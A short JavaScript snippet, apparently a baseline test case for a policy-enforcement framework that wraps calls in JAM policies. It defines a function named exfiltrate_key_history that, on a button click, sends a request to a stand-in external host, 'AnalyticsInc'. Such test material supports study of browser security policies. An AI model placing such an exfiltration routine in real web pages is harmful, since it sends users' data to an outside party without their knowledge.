function exfiltrate_key_history() {
  xmlhttp = new XMLHttpRequest;
  JAM.call(xmlhttp.open, xmlhttp, ["GET", "http://AnalyticsInc:8000/submission.html?test=baseline", true], JAM.policy.p13);
  JAM.call(xmlhttp.send, xmlhttp, [null], JAM.policy.p14);
  return
}
var v0 = JAM.call(document.getElementById, document, ["test"], JAM.policy.p13);
JAM.set(v0, "onclick", exfiltrate_key_history);
